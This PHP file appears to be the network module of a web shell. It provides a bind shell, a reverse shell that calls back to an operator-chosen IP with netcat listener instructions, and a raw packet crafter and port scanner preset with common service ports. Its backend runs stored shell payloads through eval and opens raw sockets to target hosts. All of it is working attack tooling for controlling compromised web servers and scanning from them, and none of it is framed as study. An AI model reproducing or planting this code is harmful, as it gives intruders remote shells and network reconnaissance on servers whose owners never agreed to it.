<?php
$server_addr = isset($_SERVER['SERVER_ADDR'])? $_SERVER['SERVER_ADDR']:isset($_SERVER["SERVER_NAME"])?$_SERVER["SERVER_NAME"]:"";
$remote_addr = isset($_SERVER['REMOTE_ADDR'])? $_SERVER['REMOTE_ADDR']:"";
$default_port = 13123;
$winbinary = (strtolower(substr(php_uname(),0,3))=="win")? "<option>executable</option>":"";

//<__RS__>

$GLOBALS['module']['network']['id'] = "network";
$GLOBALS['module']['network']['title'] = "Network";
$GLOBALS['module']['network']['js_ontabselected'] = "";
$GLOBALS['module']['network']['content'] = "
<table class='boxtbl'>
<thead>
	<tr><th colspan='2'><p class='boxtitle'>Bind Shell</p></th></tr>
</thead>
<tbody>
	<tr><td style='width:144px'>Server IP</td><td><input type='text' id='bindAddr' value='".$server_addr."' disabled></td></tr>
	<tr><td>Port</td><td><input type='text' id='bindPort' value='".$default_port."' onkeyup='$(\"#s_port\").html($(this).val());' onkeydown=\"trap_enter(event, 'rs_go_bind');\"></td></tr>
</tbody>
<tfoot>
	<tr>
		<td style='width:144px;'>
			<select id='bindLang' class='rsType'>
				".$winbinary."
			</select>
		</td>
		<td><span class='button' onclick=\"rs_go_bind();\" style='width:120px;'>run</span></td>
	</tr>
	<tr><td colspan='2'><pre id='bindResult'>Press ' run ' button and run ' nc ".$server_addr." <span id='s_port'>".$default_port."</span> ' on your computer</pre></td></tr>
</tfoot>
</table>
<br>
<table class='boxtbl'>
<thead>
	<tr><th colspan='2'><p class='boxtitle'>Reverse Shell</p></th></tr>
</thead>
<tbody>
	<tr><td style='width:144px'>Target IP</td><td><input type='text' id='backAddr' value='".$remote_addr."' onkeydown=\"trap_enter(event, 'rs_go_back');\"></td></tr>
	<tr><td>Port</td><td><input type='text' id='backPort' value='".$default_port."' onkeyup='$(\"#rs_port\").html($(this).val());' onkeydown=\"trap_enter(event, 'rs_go_back');\"></td></tr>
</tbody>
<tfoot>
	<tr>
		<td style='width:144px;'>
			<select id='backLang' class='rsType'>
				".$winbinary."
			</select>
		</td>
		<td><span class='button' onclick=\"rs_go('back');\" style='width:120px;'>run</span></td>
	</tr>
	<tr><td colspan='2'><pre id='backResult'>Run ' nc -l -v <span id='rs_port'>".$default_port."</span> ' on your computer and press ' run ' button</pre></td></tr>
</tfoot>
</table>
<br>
<table class='boxtbl'>
<thead>
	<tr><th colspan='2'><p class='boxtitle'>Simple Packet Crafter</p></th></tr>
</thead>
<tbody>
	<tr><td style='width:120px'>Host</td><td><input type='text' id='packetHost' value='tcp://".$server_addr."' onkeydown=\"trap_enter(event, 'packet_go');\"></td></tr>
	<tr><td>Start Port</td><td><input type='text' id='packetStartPort' value='80' onkeydown=\"trap_enter(event, 'packet_go');\"></td></tr>
	<tr><td>End Port</td><td><input type='text' id='packetEndPort' value='80' onkeydown=\"trap_enter(event, 'packet_go');\"></td></tr>
	<tr><td>Port List</td><td><input type='text' id='packetPortList' value='21|22|23|25|53|80|110|135|139|443|445|1433|3306|3389|6379|8080|11211|27017|43958' onkeydown=\"trap_enter(event, 'packet_go');\"></td></tr>
	<tr><td>Connection Timeout</td><td><input type='text' id='packetTimeout' value='5' onkeydown=\"trap_enter(event, 'packet_go');\"></td></tr>
	<tr><td>Stream Timeout</td><td><input type='text' id='packetSTimeout' value='5' onkeydown=\"trap_enter(event, 'packet_go');\"></td></tr>
</tbody>
<tfoot>
	<tr><td colspan='2'><textarea id='packetContent' style='height:140px;min-height:140px;'>GET / HTTP/1.1\\r\\nHost: ".$server_addr."\\r\\n\\r\\n</textarea></td></tr>
	<tr>
		<td>
			<span class='button' onclick=\"packet_go();\" style='width:120px;'>run</span>
		</td>
		<td>You can also press ctrl+enter to submit</td>
	</tr>
	<tr><td colspan='2'><div id='packetResult'></div></td></tr>
	<tr><td colspan='2'><div id='packetFailResult'></div></td></tr>
</tfoot>
</table>
";


if(isset($p['rsLang']) && isset($p['rsArgs'])){
	$rsLang = $p['rsLang'];
	$rsArgs = $p['rsArgs'];
	$res = "";

	if($rsLang=="php"){
		$code = get_resource("rs_".$rsLang);
		if($code!==false){
			$code = "?><?php \$target = \"".$rsArgs."\"; ?>".$code;
			$res = eval_go($rsLang, $code, "", "");
		}
	}
	else{
		$code = get_resource("rs_".$rsLang);
		if($code!==false){
			$res = eval_go($rsLang, $code, "", $rsArgs);
		}
	}

	if($res===false) $res == "error";
	output(html_safe($res));
}
elseif(isset($p['packetTimeout'])&&isset($p['packetSTimeout'])&&isset($p['packetPort'])&&isset($p['packetTimeout'])&&isset($p['packetContent'])){
	$packetHost = trim($p['packetHost']);
	if(!preg_match("/[a-z0-9]+:\/\/.*/", $packetHost)) $packetHost = "tcp://".$packetHost;

	$packetPort = (int) $p['packetPort'];

	$packetTimeout = (int) $p['packetTimeout'];
	$packetSTimeout = (int) $p['packetSTimeout'];

	$packetContent = $p['packetContent'];
	if(ctype_xdigit($packetContent)) $packetContent = @pack("H*" , $packetContent);
	else{
		$packetContent = str_replace(array("\r","\n"), "", $packetContent);
		$packetContent = str_replace(array("\\r","\\n"), array("\r", "\n"), $packetContent);
	}

	$res = "";


	$sock = fsockopen($packetHost, $packetPort, $errNo, $errStr, $packetTimeout);
	if(!$sock){
		$res .= "false|" . html_safe(trim($errStr)) . " (error ".html_safe(trim($errNo)).") on port: " . $packetPort;
	}else{
		stream_set_timeout($sock, $packetSTimeout);
        if($packetPort != 80 && $packetPort != 443 && $packetPort != 8080) {
            $packetContent = $packetContent."\r\n\r\n\x00";
        }
		fwrite($sock, $packetContent);
		$counter = 0;
		$maxtry = 1;
		$bin = "";
		do{
			$line = fgets($sock, 1024);
			if(trim($line)=="") $counter++;
			$bin .= $line;
		}while($counter<$maxtry);
		fclose($sock);
		$res .= "<hr><div><p class='boxtitle'>Host : ".html_safe($packetHost).":{$packetPort}</p><br><div id='packet{$packetPort}' style='padding:2px 4px;'>";
		$res .= "<table class='boxtbl'><tr><td><textarea style='height:140px;min-height:140px;'>".html_safe($bin)."</textarea></td></tr>";
		$res .= "<tr><td><textarea style='height:140px;min-height:140px;'>".bin2hex($bin)."</textarea></td></tr></table>";
		$res .= "</div></div>";
	}

	output($res);
}

?>